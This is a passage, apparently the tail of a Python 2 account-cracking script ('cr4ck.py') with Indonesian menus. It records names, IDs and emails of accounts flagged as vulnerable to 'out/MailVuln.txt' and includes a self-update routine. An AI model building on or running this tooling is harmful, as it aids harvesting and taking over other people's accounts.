					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
					save = open('out/MailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/MailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
##### PERBARUI #####
def perbarui():
	os.system("clear")
	print logo
	print "\033[1;94m──────────────────────────────────────────────────"
	jalan ("\033[1;92mMemperbarui Script ...\033[1;93m")
	os.system("git pull origin master")
	raw_input("\n\033[1;94m{\033[1;97m<Kembali>\033[1;94m}")
	os.system("python2 cr4ck.py")
	
	
if __name__=='__main__':
	menu()
	masuk()